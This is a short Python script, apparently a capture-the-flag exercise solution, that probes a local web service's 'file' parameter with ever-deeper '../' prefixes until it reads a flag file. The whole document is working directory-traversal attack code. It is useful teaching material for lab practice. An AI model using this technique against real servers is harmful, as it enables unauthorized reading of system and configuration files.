# ""Getting Access""
# There is a directory traversal vulnerability in the
# following page http://127.0.0.1:8082/humantechconfig?file=human.conf
# Write a script which will attempt various levels of directory
# traversal to find the right amount that will give access
# to the root directory. Inside will be a human.conf with the flag.
#
# Note: The script can timeout. If this occurs try narrowing
# down your search
import urllib.request

url = 'http://127.0.0.1:8082/humantechconfig?file='
file = 'human.conf'
appendDir = '../'

while True:
	req = urllib.request.Request(url + file)
	res = urllib.request.urlopen(req)
	data = str(res.read(), 'utf-8')
	if 'flag' in data:
		print(data)
		break
	file = appendDir + file
